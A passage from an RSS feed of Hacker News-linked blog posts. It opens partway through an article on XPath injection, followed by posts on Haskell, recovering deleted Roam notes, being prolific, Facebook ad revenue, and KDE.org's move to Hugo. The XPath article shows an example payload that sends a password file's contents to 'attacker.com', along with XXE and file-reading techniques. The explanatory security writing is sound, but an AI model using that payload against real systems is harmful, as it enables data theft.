you can make arbitrary network requests for any XML-like document you can find. If your internal services respond with
HTML that parses as XML that’s great! Or how about if all your Java/.NET configuration files are in XML, storing all
those juicy database passwords? That’s even better! <strong>We can now read them and download them via any XPath 2.0 injection
issue.</strong></p><p>Other than this the interesting thing is you can use this function to exfiltrate large quantities of data really
quickly. The specification very nicely includes <a href="https://maxtoroq.github.io/xpath-ref/fn/encode-for-uri.html" target="_blank">an encode-for-uri method</a>
,
so we could just do:</p><p><code>doc(string-join('http://attacker.com/?d', encode-for-uri(doc('passwords.xml')/some-node)))</code></p><p>Another cool issue is <a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank">external entity injection</a>
.
The tl;dr is you can serve up a malicious XML file that is requested by <code>doc()</code> that can read arbitrary files on the filesystem!</p><p>Awesome! <a href="https://xcat.readthedocs.io/en/latest/OOB-server/" target="_blank">xcat implements these attacks</a>
by the way.</p><p>The real kicker here is:</p><ul><li><p>You need to explicitly configure your XPath engine to protect against all of this, which inevitably nobody does because
nobody expects it. It’s just a simple query language, right?</p></li><li><p>There is no concept of parameterized queries like you have in every SQL adapter. It has to be done manually, and
it has to be done <strong>correctly in every input</strong>. If you miss something then you’re vulnerable to all of this!</p></li></ul><p>And this was XPath 2.0. Tom got to go to Amsterdam and
<a href="https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-Slides.pdf" target="_blank">present at Black Hat Europe</a>
, and
the world was good.</p><p>Until 2014. At which point the drugs really kicked in.</p><h2 id="xpath-3031">XPath 3.0/3.1</h2><p>It was decided in 2014 that XPath 2.0 was too simple. What it clearly, <em>clearly</em> lacked was dynamic function calls,
for loops, introspection, array map/filter/reduce, associative arrays,
<a href="https://maxtoroq.github.io/xpath-ref/fn/load-xquery-module.html" target="_blank">dynamic module loading</a>
, JSON parsing,
inline functions, exceptions and tracebacks.</p><p>So now our lovely, simple XPath has evolved into:</p><pre><code>for-each(normalize-unicode(upper-case(json-doc('x.json'))) =&gt; tokenize("\s+"),
         function($a) {
            let $a := $a * 10
            load-xquery-module('abc'):some-func(
                        function-lookup($a, 1)(array:map($a, function($b) {
                                let $c := unparsed-text-lines($b)
                                trace($c)
                                if ($c) {
                                    return xml-to-json($b)
                                } else {
                                    error('This is an error')
                                }
                        })) 
            }
)
</code></pre><p>Yay! The future is here! Can you smell the progress?</p><p>Aside from trying to turn XPath into some JavaScript-esque abomination they also added three interesting functions:</p><ul><li><a href="https://maxtoroq.github.io/xpath-ref/fn/unparsed-text.html" target="_blank">unparsed-text</a></li><li><a href="https://maxtoroq.github.io/xpath-ref/fn/environment-variable.html" target="_blank">environment-variable</a></li><li><a href="https://maxtoroq.github.io/xpath-ref/fn/json-doc.html" target="_blank">json-doc</a></li></ul><p>With these we <strong>can read any arbitrary text files</strong>, and iterate through <strong>all environment variables</strong>.</p><p>Also if your internal webservice speaks JSON, well then buddy you’re in luck! A simple XPath injection flaw can let the
attacker read all of those responses using the handy JSON functions introduced in 3.1.</p><p>So by utilizing the same injection flaw and the same out-of-bound attack discussed above we can exfiltrate any readable
file on the filesystem, or network, quickly and cleanly.</p><h2 id="summary">Summary</h2><p>I’m sure they are already working on XPath 4.0. I wonder if they will add access to raw network sockets, or hell, maybe
DirectX support. Why not?</p></div></div></section></div>]]>
            </description>
            <link>https://tomforb.es/xcat-1.0-released-or-xpath-injection-issues-are-severely-underrated/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944846</guid>
            <pubDate>Fri, 30 Oct 2020 17:43:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24944673">thread link</a>) | @anentropic
<br/>
October 30, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944673</guid>
            <pubDate>Fri, 30 Oct 2020 17:28:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Recovering Lost Roam Notes]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24944574">thread link</a>) | @jchen42
<br/>
October 30, 2020 | https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/ | <a href="https://web.archive.org/web/*/https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This post dives deep into a scary data loss scenario - we'll cover identifying the data loss, investigating the root cause, and finally recovering the data.</p>
<p><strong>This bug affected Readwise users who exported their highlights (both manually &amp; automatically) to Roam on 10/27. If you are one of those users, you should contact Roam support &amp; use <a href="https://github.com/jchen1/roam-restore" target="_blank" rel="nofollow noopener noreferrer">my recovery code</a> ASAP!</strong></p>
<!-- excerpt -->
<h2>Background</h2>
<p><a href="https://roamresearch.com/" target="_blank" rel="nofollow noopener noreferrer">Roam</a> is a "note-taking tool for networked thought". It supports all sorts of cool things - what's relevant here is that it automatically creates a new page for every day, your Daily Notes. Recently, I started using <a href="https://readwise.io/" target="_blank" rel="nofollow noopener noreferrer">Readwise</a>, which ingests Kindle highlights and uses <a href="https://en.wikipedia.org/wiki/Spaced_repetition" target="_blank" rel="nofollow noopener noreferrer">spaced repetition</a> to help you remember what you read. Readwise has a Roam integration, which automatically adds Kindle highlights to Roam. Unfortunately, since Roam doesn't have a public API yet, Readwise's integration seems to be effectively using Selenium - clicking on elements and pasting highlights which is inherently flaky.</p>
<p>Yesterday, I woke up without my Daily Notes from the day before. Disaster! Fortunately, with the help of the Roam Slack group and Tristan from Readwise, I was able to isolate the cause of note deletion and even restore my lost data. Here's what happened:</p>
<h2>Roam architecture</h2>
<p>Roam uses <a href="https://github.com/tonsky/datascript" target="_blank" rel="nofollow noopener noreferrer">Datascript</a> for its client-side database. Like Datomic, Datascript stores data as a <code>datom</code>, defined as <code>[e a v tx]</code>, or <code>entity</code>, <code>attribute</code>, <code>value</code>, and <code>transaction-id</code> (incrementing integer). If you're interested in learning more, <a href="https://tonsky.me/blog/datascript-internals/" target="_blank" rel="nofollow noopener noreferrer">Datascript's author has an excellent overview</a>.</p>
<p>Importantly for us, Roam differs from other webapps in that it doesn't store all state and history in its backend. Instead, Roam's backend just stores a snapshotted Datascript database (updated ~daily as far as I can tell) and the list of transactions since that last snapshot. If we can download those two things before Roam's next snapshot, we have two breadcrumbs towards recovery: 1. We can find the transaction that deleted my Daily Notes page 2. We can also reconstruct our Datascript database, replaying transactions up until the point of deletion, and recover our Daily Notes from that!</p>
<h2>Capturing state</h2>
<p>Our first step is to store Roam's database snapshot and transaction list. Instead of REST API calls, Roam uses a Websocket connection to send these to its web client. This complicates things for us: instead of just saving API responses with <code>curl</code>, we need to download a <a href="https://en.wikipedia.org/wiki/HAR_%28file_format%29" target="_blank" rel="nofollow noopener noreferrer">HAR file</a>, which, fortunately for us, includes Websocket traffic with more recent Chrome versions. HAR files are just JSON archives stored in chronological order - it's easy to select just the Websocket traffic:</p>
<pre><code>(<span><span>defn</span></span> parse-har
  [harfile]
  (<span><span>let</span></span> [json (<span>json/parse-string</span> (<span><span>slurp</span></span> harfile) <span>true</span>)
        ws-messages (<span><span>-&gt;&gt;</span></span> json <span>:log</span> <span>:entries</span> (<span><span>filter</span></span> #(<span>some?</span> (<span>:_webSocketMessages</span> %))) second <span>:_webSocketMessages</span>)
        ws-data (<span><span>map</span></span> <span>:data</span> ws-messages)]
    ws-data))</code></pre>
<p>Inspecting this data more closely, it appears that Roam's websocket messages are generally JSON strings (and occasionally numbers). When a message is more than 16KB, it's split into multiple messages without wrapping - so we'll need to stitch these bigger messages together. One way to detect a non-split-message is to just try and parse it as JSON - if it's valid, we can say it's non-split. (There's an edge case we're unlikely to hit here: if the 16KB chunk just so happens to be valid JSON as well we'll be out of luck. Lucky for us, I didn't run into this!) Now, we can extend <code>parse-har</code> as follows:</p>
<pre><code>(<span><span>defn</span></span> parse-har
  [harfile]
  (<span><span>let</span></span> [json (<span>json/parse-string</span> (<span><span>slurp</span></span> harfile) <span>true</span>)
        ws-messages (<span><span>-&gt;&gt;</span></span> json <span>:log</span> <span>:entries</span> (<span><span>filter</span></span> #(<span>some?</span> (<span>:_webSocketMessages</span> %))) second <span>:_webSocketMessages</span>)
        ws-data (<span><span>map</span></span> <span>:data</span> ws-messages)
        try-parse #(<span><span>try</span></span> (<span>json/parse-string</span> % <span>true</span>)
                        (<span>catch</span> Throwable _ <span>nil</span>))
        
        
        
        ws-json (<span><span>reduce</span></span> (<span><span>fn</span></span> [{<span>:keys</span> [done partial]} next]
                          (<span><span>let</span></span> [potential-json-str (<span><span>str</span></span> partial next)]
                            (<span><span>if-let</span></span> [json (<span>try-parse</span> potential-json-str)]
                              {<span>:done</span> (<span><span>conj</span></span> done json)
                               <span>:partial</span> <span>""</span>}
                              {<span>:done</span> done
                               <span>:partial</span> potential-json-str})))
                        {<span>:done</span> [] <span>:partial</span> <span>""</span>}
                        ws-data)]
    (<span><span>assert</span></span> (<span><span>=</span></span> (<span>:partial</span> ws-json) <span>""</span>))
    (<span>:done</span> ws-json)))</code></pre>
<h2>Finding the culprit</h2>
<p>Armed with our parsed websocket messages, we can see that many of them look like transactions. One that looks particularly suspicious has a nested field named <code>tx-meta</code> with the value <code>delete-page</code>! The transaction looks something like this:</p>
<pre><code>{<span>:app-version</span> <span>"0.7.4"</span>,
 <span>:email</span> <span>"hello@jeff.yt"</span>,
 <span>:session-id</span> <span>"uuid95d98efd-c8fa-4412-87a4-e7b7201bee24"</span>,
 <span>:t</span> <span>1603947791561</span>,
 <span>:time</span> <span>1603947791542</span>,
 <span>:tx</span> <span>"[[\"^ \",\"~:block/uid\",\"ogCRjInhE\",\"~:block/string\",\"some-text-here\",\"~:edit/time\",1603947791363,\"~:edit/email\",\"hello@jeff.yt\"],[\"^ \",\"^0\",\"4CpSytRnt\",\"^1\",\"Highlights first synced by #Readwise October 28th, 2020\",\"^2\",1603947791364,\"^3\",\"hello@jeff.yt\"],[\"^ \",\"^0\",\"C-IOsE50G\",\"^1\",\"New highlights added October 28th, 2020 at 11:03 PM\",\"^2\",1603947791364,\"^3\",\"hello@jeff.yt\"],[\"~:db.fn/retractEntity\",[\"^0\",\"hLBqaz4gS\"]],[\"^4\",[\"^0\",\"vwD08rqdT\"]],[\"^4\",[\"^0\",\"6VWOGgeAd\"]],[\"^4\",[\"^0\",\"P56-fWN2O\"]],[\"^4\",[\"^0\",\"SffV3NfN2\"]],[\"^4\",[\"^0\",\"qnZBZCGCv\"]],[\"^4\",[\"^0\",\"10-28-2020\"]]]"</span>,
 <span>:tx-meta</span> {<span>:event-id</span> <span>"uuid719b009f-b969-47b6-b2db-41542d10b328"</span>,
           <span>:event-name</span> <span>"delete-page"</span>,
           <span>:tx-id</span> <span>"uuid289e80fc-4c27-4d54-9df4-d83ac0ceeaed"</span>,
           <span>:tx-name</span> <span>"delete-page"</span>}}</code></pre>
<p>I omitted ~90% of the transaction to save space - but it's more of the same. This definitely looks like the transaction that deleted my Daily Notes page: I see <code>db.fn/retractEntity</code> as well as <code>10-28-2020</code> in the transaction. Interestingly, this transaction captures two Readwise interactions as well. It's not a smoking gun, but it's definitely suspicious that Readwise was operating on my database at the <strong>exact same time</strong> that my page was mysteriously deleted!</p>
<p>Let's pause here, and check in with the Roam Slack group. Someone else has already started a thread about data loss! They and others quickly confirm that they also all have Readwise's auto-export enabled. Again, it's not confirmation that Readwise is to blame, but it's enough for me to stop what I'm doing and disable my Readwise integration! We'll also share our knowledge in the Slack thread and ask affected users to save their Roam HAR file like we did.</p>
<p>Later, <a href="https://twitter.com/homsiT" target="_blank" rel="nofollow noopener noreferrer">Tristan, founder of Readwise</a>, pops into Slack and quickly confirms that <a href="https://twitter.com/homsiT/status/1321856588022513665" target="_blank" rel="nofollow noopener noreferrer">a recent Roam behavior change combined with the Readwise integration can cause deleted pages</a>. Huge props to Tristan who responds perfectly: he triages the issue, disables the feature to prevent any more users from hitting it, and fixes &amp; re-enables auto-export all within a couple hours! Tristan also remains communicative and takes full responsibility, even offering refunds, though I'd argue that these hiccups are bound to happen when Roam still hasn't opened up their public API.</p>
<h2>Deserializing the database</h2>
<p>Peeking again at our parsed HAR file, we see what appears to be our serialized database - it's stored like this:</p>
<pre><code>{<span>:split-db</span> {<span>0</span> <span>"transit-encoded-str-0"</span>
            <span>1</span> <span>"transit-encoded-str-1"</span>
            ...}}</code></pre>
<p>Each string looks something like this:</p>
<pre><code>[\\\"^P\\\",[1641,\\\"^H\\\",\\\"zeciaTJfg\\\",536877373]],[\\\"^P\\\",[1641,\\\"^17\\\",\\\"hello@jeff.yt\\\",536877373]],[\\\"^P\\\",[1641,\\\"^18\\\",1583270770601,536877373]],[\\\"^P\\\",[1641,\\\"^R\\\",\\\"hello@jeff.yt\\\",536877373]],[\\\"^P\\\",[1641,\\\"^S\\\",1583270784121,536877377]],[\\\"^P\\\",[1642,\\\"^E\\\",1643,536877384]]
</code></pre>
<p>This looks like Transit! <a href="https://github.com/cognitect/transit-format" target="_blank" rel="nofollow noopener noreferrer">Transit</a> is a JSON-like format for sending data between applications (<a href="https://blog.klipse.tech/clojure/2016/09/22/transit-clojure.html" target="_blank" rel="nofollow noopener noreferrer">this post</a> is a good introduction). Datascript has its own <a href="https://github.com/tonsky/datascript-transit/" target="_blank" rel="nofollow noopener noreferrer">set of Transit handlers</a> - let's import that and see if we get a working database! Of course, we'll also need to combine <code>split-db</code> by smashing the Transit-encoded strings together.</p>
<pre><code>(<span>require</span> '[datascript.transit <span>:as</span> dt])

(<span><span>defn</span></span> parse-db
  [parsed-har]
  (<span><span>let</span></span> [db-str (<span><span>-&gt;&gt;</span></span> parsed-har
                    
                    (<span><span>filter</span></span> #(<span>some-&gt;</span> % <span>:d</span> <span>:b</span> <span>:d</span> <span>:split-db</span>))
                    first <span>:d</span> <span>:b</span> <span>:d</span> <span>:split-db</span>
                    vals
                    (<span>string/join</span> <span>""</span>))]
    (<span>dt/read-transit-str</span> db-str)))</code></pre>
<p>Voila - a real Datascript database! We can confirm it's my Roam database by querying it:</p>
<pre><code>(<span>require</span> '[datascript.core <span>:as</span> d])
(<span><span>let</span></span> [db (<span><span>-&gt;</span></span> harfile (<span>parse-har</span>) (<span>parse-db</span>))
      conn (<span>d/conn-from-db</span> db)]
  (<span>d/q</span> '[<span>:find</span> ?e <span>:where</span> [?e <span>:node/title</span> <span>"Daily Template"</span>]] @conn))

</code></pre>
<p>With a working Roam database, our next step is to apply all of the transactions we have up until the deletion event. Transactions are Transit-encoded, and we'll have to do quite a bit of data manipulation to get a list of them. Once we have that list, we can sort the transactions and apply them sequentially:</p>
<pre><code>(<span><span>defn</span></span> apply-transactions-until
  [db parsed-har until-time]
  (<span><span>let</span></span> [transactions-to-apply (<span><span>-&gt;&gt;</span></span> parsed-har
                                   (<span><span>map</span></span> #(<span>some-&gt;</span> % <span>:d</span> <span>:b</span> <span>:d</span>))
                                   (<span><span>filter</span></span> seqable?)
                                   (<span><span>apply</span></span> concat)
                                   (<span><span>filter</span></span> #(<span>string/starts-with?</span> (<span><span>-&gt;</span></span> % first name) <span>"-MK"</span>))
                                   (<span><span>map</span></span> second)
                                   (<span><span>filter</span></span> #(<span><span>&lt;</span></span> (<span>:time</span> %) until-time))
                                   (<span><span>sort-by</span></span> <span>:time</span>)
                                   (<span><span>map</span></span> <span>:tx</span>)
                                   (<span><span>map</span></span> dt/read-transit-str))
        conn (<span>d/conn-from-db</span> db)]
    (<span><span>doseq</span></span> [tx transactions-to-apply]
      (<span>d/transact!</span> conn tx))
    (<span>d/db</span> conn)))</code></pre>
<p>Here, <code>until-time</code> is the time of the deletion transaction. We're so close now! We've managed to materialize my Roam database from <strong>right before my notes were deleted</strong>! All we need to do now is pull that deleted page, and we'll be done!</p>
<h2>Recoverin…</h2></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/">https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/</a></em></p>]]>
            </description>
            <link>https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944574</guid>
            <pubDate>Fri, 30 Oct 2020 17:21:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why to Be Prolific]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24944562">thread link</a>) | @jerodsanto
<br/>
October 30, 2020 | https://www.chrismytton.com/be-prolific/ | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/be-prolific/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<hr>

<p><a href="https://news.ycombinator.com/item?id=24866706" target="_blank">Discussion on Hacker News</a>.</p>

<p><a href="https://eduardoorige.com.br/posts/seja-prolifico/index.html" target="_blank">Portuguese translation</a> by Eduardo Orige.</p>

<p><a href="https://farzat.online/2020/10/28/be-prolific/" target="_blank">Arabic translation</a> by Farzat Al Chayah.</p>

    </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/be-prolific/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944562</guid>
            <pubDate>Fri, 30 Oct 2020 17:21:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Revenue Takes Care of Itself]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24944559">thread link</a>) | @yarapavan
<br/>
October 30, 2020 | https://boz.com/articles/revenue | <a href="https://web.archive.org/web/*/https://boz.com/articles/revenue">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>Bill Walsh is one of the greatest coaches in the history of the NFL. He
started with a 49ers team that only won two games and within two years they
had won their first Super Bowl. He retired after 10 years but before he was
done they would win two more. A decade later more than half of the head
coaches in the NFL had once served on his staff.</p>
<p>Just before he passed away he wrote a book on leadership entitled “<a href="https://www.amazon.com/Score-Takes-Care-Itself-Philosophy/dp/1591843472/">The Score
Takes Care of
Itself</a>.”
His idea was simple enough: you don’t win football games by trying to score.
You don’t build championship teams by trying to win.  Instead he set a high
standard of performance and held people to it on the execution of every play.
He believed there were good losses and bad wins. He believed that if you had
good people, a good culture, and strong guiding principles then the score
would take care of itself.</p>
<p>If you go back to 2012 there are some analogies one could draw between the
49ers of that era and the performance of Facebook ads. I don’t know if we even
had two wins before 2012. But after? Well, they don’t give out Lombardi
trophies for digital advertising but I think if they did we’d be a contender.</p>
<p>The far more interesting connection between these stories is the approach. We
didn’t establish ourselves as a leading digital advertising platform by
focusing on the obvious metric of revenue. We realized that when it came to
revenue there were good losses and bad wins. We explicitly focused on
advertiser value and consumer value even when it came at the cost of revenue.
This wasn’t just cultural; our ranking systems and auction focus on optimizing
advertiser value and consumer experience rather than revenue to Facebook. By
focusing on our people, on our culture, and on strong guiding principles we
have been able to demonstrate that the revenue takes care of itself.</p>
<p>Focusing on metrics has <a href="https://en.wikipedia.org/wiki/Goodhart%27s_law">well established
problems</a>, but in the case of
revenue there are two even more pathological ones.</p>
<p>Revenue is a trailing indicator. When people are just getting started with a
new service they don’t just dive in with their full budget. They invest a
little and revise their budget allocation incrementally. If you push too hard
on revenue you can get 100% of the budget they allocated you today but you are
missing the bigger opportunity to give them outsized returns which is what
will cause them to allocate you more of their budget in the future.</p>
<p>Revenue is short term. In many of our products a focus on maximizing revenue
would lead us down a very different path than maximizing value. Maximizing
value often requires long term investments whose return profile is risky or
entirely unknown. But we know that without those types of long term
investments our business growth will start to plateau as we saturate the value
created by existing solutions.</p>
<p>Mark had a famous line in the S-1 we filed for our IPO: “We don’t build
products to make money, we make money to build great products.” I agree
wholeheartedly which is why the mission of the Facebook ads organization isn’t
to make money. It is to make meaningful connections between people and
businesses. And we take that seriously.</p></section></div></div>]]>
            </description>
            <link>https://boz.com/articles/revenue</link>
            <guid isPermaLink="false">hacker-news-small-sites-24944559</guid>
            <pubDate>Fri, 30 Oct 2020 17:20:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[KDE.org migrated to Hugo]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 78 (<a href="https://news.ycombinator.com/item?id=24944537">thread link</a>) | @ognarb
<br/>
October 30, 2020 | https://carlschwan.eu/2020/10/30/kde-org-hugo.html | <a href="https://web.archive.org/web/*/https://carlschwan.eu/2020/10/30/kde-org-hugo.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img src="https://carlschwan.eu/assets/img/heading_hugo.png" alt="Screenshot KDE.org"></p>

<p><a href="https://kde.org/">KDE.org</a> now uses <a href="https://gohugo.io/">Hugo</a>. Hugo is a fast and modern static site
generator written in Go. It provides a few improvements over the old system that was
using plain PHP. A large part of the work was done by Anuj during GSoC 2020. This
was a massive work, converting the repository storing more than 20 years of KDE
history.</p>

<p>The website is now generated once and no longer uses PHP to generate itself at runtime.
This improves the loading speed of the website, but the speed boost is not significant,
since the PHP code used before was quite small and KDE’s servers are powerful.</p>

<p>But the biggest improvement is in terms of features. We are now working with markdown
files instead of raw HTML files, this makes the life of the promo team much easier.</p>

<p>The internationalization of the website now creates a unique URL per language, this
should allow Google to link to the version of the website using the correct language.
A <a href="https://kde.org/fr/">French</a>, <a href="https://kde.org/uk/">Ukrainian</a>,
<a href="https://kde.org/ca/">Catalan</a>, <a href="https://kde.org/nl/">Dutch</a>, and a few more languages
are already available. There is also a proper language selector! We also don’t need
to manually tag each string for translations.</p>

<p>There is also now an <a href="https://kde.org/announcements/index.xml">RSS feed</a> with all the
latest announcements. Another big improvement is that the announcements list is
autogenerated and no longer modified by hand and with the help of the release scripts.</p>

<p>Another nice change for website developers is that now the SCSS code for the individual
pages is located in the kde-org repository itself instead of another repository.
Overall the developer experience is much better, there is no need to set up an apache
server and to the PHP configs to include the <a href="https://invent.kde.org/websites/capacity">capacity framework</a>, just to get the
website running locally. Now you only need to download the Hugo binary from their
release page and run it on the repo.</p>

<h2 id="hugo-and-gettext">Hugo and Gettext</h2>

<p>The internationalization of KDE.org was quite a challenge. When working on a multilingual
website with Hugo, Hugo expects a markdown document per language for each translated
page.</p>

<div><div><pre><code>plasma-desktop.md
plasma-desktop.es.md
plasma-desktop.fr.md
plasma-desktop.uk.md
...
</code></pre></div></div>

<p>The problem is that traditional translations workflow rely on a string-based approach,
where a document is split in paragraphs and translated individually. So I couldn’t
just put each file markdown file as big blobs in the po files. To solve this problem,
I created a python script splitting the markdown files in paragraphs, simplifying
the markdown syntax (removing leading <code>#</code> and <code>+</code> for heading and list item). This
script also handles Hugo shortcodes transforming:</p>

<div><div><pre><code>
{{&lt; img caption="My figure caption" alt="My accessible description" src="..." &gt;}}

</code></pre></div></div>

<p>in two strings:</p>

<ul>
  <li>My figure caption</li>
  <li>My accessible description</li>
</ul>

<p>The script can obliviously put the individual strings back in place. The scripts also
handle the menu translation, and the translations of the strings in the footers.
For now, the script is just a file in the kde-org repository, but I would like to
transform it to a standalone library so that other gettext and Hugo users can
translate their website.</p>

<p>Using Hugo API, the language selector was trivial to write:</p>

<div><div><pre><code>
&lt;ul class="navbar-nav ml-auto"&gt;
  {{ if .IsTranslated }}
    &lt;li class="nav-item dropdown" aria-describedby="language-picker-description"&gt;
      &lt;p class="sr-only" id="language-picker-description"&gt;{{ i18n "Select-your-language" }}&lt;/p&gt;
      &lt;a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"&gt;
        &lt;img src="/Language-Icons/icon20x24px-exported-transparent.png" alt="" /&gt;
        &lt;span&gt;{{ i18n "translations" }}&lt;/span&gt;
      &lt;/a&gt;
      &lt;div class="dropdown-menu dropdonw-trans" role="listbox"&gt;
        &lt;a class="dropdown-item" aria-selected="true" hreflang="{{ .Site.Language.Lang }}" role="option" lang="{{ .Site.Language.Lang }}" href="{{ .Permalink }}"&gt;{{ .Site.Language.LanguageName }}&lt;/a&gt;
        {{ range .Translations }}
          &lt;a class="dropdown-item" hreflang="{{ .Language.Lang }}" role="option" lang="{{ .Language.Lang }}" href="{{ .Permalink }}"&gt;{{ .Language.LanguageName }}&lt;/a&gt;
        {{ end }}
      &lt;/div&gt;
    &lt;/li&gt;
  {{ end }}
&lt;/ul&gt;

</code></pre></div></div>

<p>This is a bit verbose because this selector is also fully accessible for screen readers.</p>

<p>There are a few more tricks employed in kde.org to improve the internationalization, for
example when a page doesn’t exist in a language, there is an Apache rule redirecting it
to the English version. Another nice trick is that there is a special Hugo shortcode
called <code>i18n_var</code> and used to parametrize the strings. For example:</p>

<div><div><pre><code>
{{&lt; i18n_var "Today KDE releases a bugfix update to KDE Plasma 5, versioned %[1]s" "5.20.2" &gt;}}

</code></pre></div></div>

<p>And the extractor is clever and only extract the part that needs to be translated.</p>

<p><a href="https://invent.kde.org/websites/kde-org/-/blob/master/translations.py">The script</a></p>

